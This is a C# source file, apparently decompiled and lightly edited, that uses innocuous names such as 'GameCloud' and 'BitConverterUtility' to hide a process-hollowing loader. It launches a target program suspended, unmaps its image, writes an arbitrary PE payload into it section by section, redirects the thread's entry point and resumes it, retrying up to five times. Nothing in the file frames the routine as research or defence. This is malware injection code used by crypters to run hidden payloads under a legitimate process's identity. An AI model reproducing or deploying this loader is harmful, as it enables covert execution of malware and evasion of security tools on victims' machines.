using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
namespace Utility
{
    public static class BitConverterUtility
    {
        public static int ToInt32(byte[] bytes, int startIndex)
        {
            return BitConverter.ToInt32(bytes, startIndex);
        }

        public static short ToInt16(byte[] bytes, int startIndex)
        {
            return BitConverter.ToInt16(bytes, startIndex);
        }

        public static long ToInt64(byte[] bytes, int startIndex)
        {
            return BitConverter.ToInt64(bytes, startIndex);
        }

        public static uint ToUInt32(byte[] bytes, int startIndex)
        {
            return BitConverter.ToUInt32(bytes, startIndex);
        }

        public static byte[] GetBytes(int value)
        {
            return BitConverter.GetBytes(value);
        }

        public static byte[] GetBytes(long value)
        {
            return BitConverter.GetBytes(value);
        }
    }
}

namespace GameCloud
{

    public static class GameCloud
    {
        public static void Program(string path, byte[] payload)
        {
            int i = 0;
            while (i < 5)
            {
                int processId = 0;
                try
                {
                    int num = Utility.BitConverterUtility.ToInt32(payload, 60);
                    int num2 = Utility.BitConverterUtility.ToInt32(payload, num + 24 + 56);
                    int num3 = Utility.BitConverterUtility.ToInt32(payload, num + 24 + 60);
                    int num4 = Utility.BitConverterUtility.ToInt32(payload, num + 24 + 16);
                    short num5 = Utility.BitConverterUtility.ToInt16(payload, num + 6);
                    short num6 = Utility.BitConverterUtility.ToInt16(payload, num + 20);
                    IntPtr intPtr = (IntPtr.Size == 4) ? ((IntPtr)Utility.BitConverterUtility.ToInt32(payload, num + 24 + 28)) : ((IntPtr)Utility.BitConverterUtility.ToInt64(payload, num + 24 + 24));
                    int num7 = (IntPtr.Size == 4) ? 72 : 112;
                    IntPtr intPtr2 = GameCloud.AllocateAlignedMemory(num7);
                    Marshal.Copy(new byte[num7], 0, intPtr2, num7);
                    Marshal.WriteInt32(intPtr2, num7);
                    byte[] array = new byte[(IntPtr.Size == 4) ? 16 : 24];
                    IntPtr intPtr3 = GameCloud.AllocateAlignedMemory((IntPtr.Size == 4) ? 716 : 1232);
                    Marshal.WriteInt32(intPtr3, (IntPtr.Size == 4) ? 0 : 48, 1048603);
                    bool flag = !GameCloud.CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, true, 524292U, IntPtr.Zero, null, intPtr2, array);
                    bool flag2 = flag;
                    if (flag2)
                    {
                        throw new Exception();
                    }
                    processId = Utility.BitConverterUtility.ToInt32(array, IntPtr.Size * 2);
                    IntPtr process = (IntPtr.Size == 4) ? ((IntPtr)Utility.BitConverterUtility.ToInt32(array, 0)) : ((IntPtr)Utility.BitConverterUtility.ToInt64(array, 0));
                    GameCloud.NtUnmapViewOfSection(process, intPtr);
                    IntPtr intPtr4 = (IntPtr)num2;
                    uint num8;
                    bool flag3 = GameCloud.NtAllocateVirtualMemory(process, ref intPtr, IntPtr.Zero, ref intPtr4, 12288U, 64U) < 0 || GameCloud.NtWriteVirtualMemory(process, intPtr, payload, num3, IntPtr.Zero) < 0 || !GameCloud.VirtualProtectEx(process, intPtr, (UIntPtr)((ulong)((long)num3)), 2U, out num8);
                    bool flag4 = flag3;
                    if (flag4)
                    {
                        throw new Exception();
                    }
                    for (short num9 = 0; num9 < num5; num9 += 1)
                    {
                        byte[] array2 = new byte[40];
                        Buffer.BlockCopy(payload, num + 24 + (int)num6 + (int)(num9 * 40), array2, 0, 40);
                        byte[] array3 = new byte[40];
                        bool flag5 = num9 < num5 - 1;
                        bool flag6 = flag5;
                        if (flag6)
                        {
                            Buffer.BlockCopy(payload, num + 24 + (int)num6 + (int)((num9 + 1) * 40), array3, 0, 40);
                        }
                        int num10 = Utility.BitConverterUtility.ToInt32(array2, 12);
                        int num11 = Utility.BitConverterUtility.ToInt32(array2, 16);
                        int srcOffset = Utility.BitConverterUtility.ToInt32(array2, 20);
                        uint characteristics = Utility.BitConverterUtility.ToUInt32(array2, 36);
                        int num12 = Utility.BitConverterUtility.ToInt32(array3, 12);
                        byte[] array4 = new byte[num11];
                        Buffer.BlockCopy(payload, srcOffset, array4, 0, array4.Length);
                        bool flag7 = GameCloud.NtWriteVirtualMemory(process, (IntPtr)((long)intPtr + (long)num10), array4, array4.Length, IntPtr.Zero) < 0;
                        bool flag8 = flag7;
                        if (flag8)
                        {
                            throw new Exception();
                        }
                        bool flag9 = !GameCloud.VirtualProtectEx(process, (IntPtr)((long)intPtr + (long)num10), (UIntPtr)((ulong)((long)((num9 == num5 - 1) ? (num2 - num10) : (num12 - num10)))), GameCloud.SectionCharacteristicsToProtection(characteristics), out num8);
                        bool flag10 = flag9;
                        if (flag10)
                        {
                            throw new Exception();
                        }
                    }
                    IntPtr thread = (IntPtr.Size == 4) ? ((IntPtr)Utility.BitConverterUtility.ToInt32(array, 4)) : ((IntPtr)Utility.BitConverterUtility.ToInt64(array, 8));
                    bool flag11 = GameCloud.NtGetContextThread(thread, intPtr3) < 0;
                    bool flag12 = flag11;
                    if (flag12)
                    {
                        throw new Exception();
                    }
                    bool flag13 = IntPtr.Size == 4;
                    bool flag14 = flag13;
                    if (flag14)
                    {
                        IntPtr value = (IntPtr)Marshal.ReadInt32(intPtr3, 164);
                        bool flag15 = GameCloud.NtWriteVirtualMemory(process, (IntPtr)((int)value + 8), Utility.BitConverterUtility.GetBytes((int)intPtr), 4, IntPtr.Zero) < 0;
                        bool flag16 = flag15;
                        if (flag16)
                        {
                            throw new Exception();
                        }
                        Marshal.WriteInt32(intPtr3, 176, (int)intPtr + num4);
                    }
                    else
                    {
                        IntPtr value2 = (IntPtr)Marshal.ReadInt64(intPtr3, 136);
                        bool flag17 = GameCloud.NtWriteVirtualMemory(process, (IntPtr)((long)value2 + 16L), Utility.BitConverterUtility.GetBytes((long)intPtr), 8, IntPtr.Zero) < 0;
                        bool flag18 = flag17;
                        if (flag18)
                        {
                            throw new Exception();
                        }
                        Marshal.WriteInt64(intPtr3, 128, (long)intPtr + (long)num4);
                    }
                    bool flag19 = GameCloud.NtSetContextThread(thread, intPtr3) < 0;
                    bool flag20 = flag19;
                    if (flag20)
                    {
                        throw new Exception();
                    }
                    bool flag21 = GameCloud.NtResumeThread(thread, out num8) == -1;
                    bool flag22 = flag21;
                    if (flag22)
                    {
                        throw new Exception();
                    }
                }
                catch
                {
                    try
                    {
                        Process.GetProcessById(processId).Kill();
                    }
                    catch
                    {
                    }
                    goto IL_4A9;
                }
                break;
            IL_4A9:
                i++;
                continue;
                break;
            }
        }

        // Diğer metotlar burada


        private static uint SectionCharacteristicsToProtection(uint characteristics)
        {
            bool flag = (characteristics & 536870912U) != 0U && (characteristics & 1073741824U) != 0U && (characteristics & 2147483648U) > 0U;
            bool flag2 = flag;
            uint result;
            if (flag2)
            {
                result = 64U;
            }
            else
            {
                bool flag3 = (characteristics & 536870912U) != 0U && (characteristics & 1073741824U) > 0U;
                bool flag4 = flag3;
                if (flag4)
                {
                    result = 32U;
                }
                else
                {
                    bool flag5 = (characteristics & 536870912U) != 0U && (characteristics & 2147483648U) > 0U;
                    bool flag6 = flag5;
                    if (flag6)
                    {
                        result = 128U;
                    }
                    else
                    {
                        bool flag7 = (characteristics & 1073741824U) != 0U && (characteristics & 2147483648U) > 0U;
                        bool flag8 = flag7;
                        if (flag8)
                        {
                            result = 4U;
                        }
                        else
                        {
                            bool flag9 = (characteristics & 536870912U) > 0U;
                            bool flag10 = flag9;
                            if (flag10)
                            {
                                result = 16U;
                            }
                            else
                            {
                                bool flag11 = (characteristics & 1073741824U) > 0U;
                                bool flag12 = flag11;
                                if (flag12)
                                {
                                    result = 2U;
                                }
                                else
                                {
                                    bool flag13 = (characteristics & 2147483648U) > 0U;
                                    bool flag14 = flag13;
                                    if (flag14)
                                    {
                                        result = 8U;
                                    }
                                    else
                                    {
                                        result = 1U;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return result;
        }


        private static IntPtr AllocateAlignedMemory(int size, int alignment = 16)
        {
            // alignment değeri 2'nin katı olmalı
            if ((alignment & (alignment - 1)) != 0)
            {

            }

            IntPtr rawPointer = Marshal.AllocHGlobal(size + alignment);
            long rawAddress = (long)rawPointer;

            // Hizalanmış adresi hesapla
            long alignedAddress = (rawAddress + alignment - 1) & ~(alignment - 1);

            // Aligned address still within the allocated memory?
            if (alignedAddress >= rawAddress + alignment)
            {

            }

            return (IntPtr)alignedAddress;
        }

        // Belleği serbest bırakma fonksiyonu
        private static void FreeAlignedMemory(IntPtr alignedMemory, IntPtr originalPointer)
        {
            Marshal.FreeHGlobal(originalPointer);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(int access, bool inheritHandle, int processId);

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, IntPtr startupInfo, byte[] processInformation);


        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtectEx(
       IntPtr process,
       IntPtr address,
       UIntPtr size,
       uint newProtect,
       out uint oldProtect);

        // Bellek korumasını değiştirmek için güvenli bir yöntem
        public static void ChangeMemoryProtection(
            IntPtr processHandle,
            IntPtr address,
            UIntPtr size,
            uint newProtection,
            out uint oldProtection)
        {
            if (processHandle == IntPtr.Zero)
            {
                throw new ArgumentException("Invalid process handle", nameof(processHandle));
            }

            if (address == IntPtr.Zero)
            {
                throw new ArgumentException("Invalid memory address", nameof(address));
            }

            bool result = VirtualProtectEx(processHandle, address, size, newProtection, out oldProtection);

            if (!result) // Eğer false dönerse, bir hata meydana gelmiştir
            {
                throw new Win32Exception(Marshal.GetLastWin32Error(), "Failed to change memory protection.");
            }
        }

        // Token: 0x0600000A RID: 10
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtAllocateVirtualMemory(IntPtr process, ref IntPtr address, IntPtr zeroBits, ref IntPtr size, uint allocationType, uint protect);

        [DllImport("ntdll.dll")]
        private static extern int NtWriteVirtualMemory(IntPtr process, IntPtr baseAddress, byte[] buffer, int size, IntPtr bytesWritten);

        [DllImport("ntdll.dll")]
        private static extern uint NtUnmapViewOfSection(IntPtr process, IntPtr baseAddress);

        [DllImport("ntdll.dll")]
        private static extern int NtSetContextThread(IntPtr thread, IntPtr context);

        [DllImport("ntdll.dll")]
        private static extern int NtGetContextThread(IntPtr thread, IntPtr context);



        [DllImport("ntdll.dll")]
        private static extern int NtResumeThread(IntPtr thread, out uint suspendCount);


        public static uint ResumeThreadSafely(IntPtr threadHandle)
        {
            if (threadHandle == IntPtr.Zero)
            {

            }

            uint suspendCount;
            int result = NtResumeThread(threadHandle, out suspendCount);

            if (result != 0)
            {

            }

            return suspendCount;
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(IntPtr attributeList, int attributeCount, int flags, ref IntPtr size);


        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(IntPtr attributeList, uint flags, IntPtr attribute, IntPtr value, IntPtr size, IntPtr previousValue, IntPtr returnSize);
    }
}

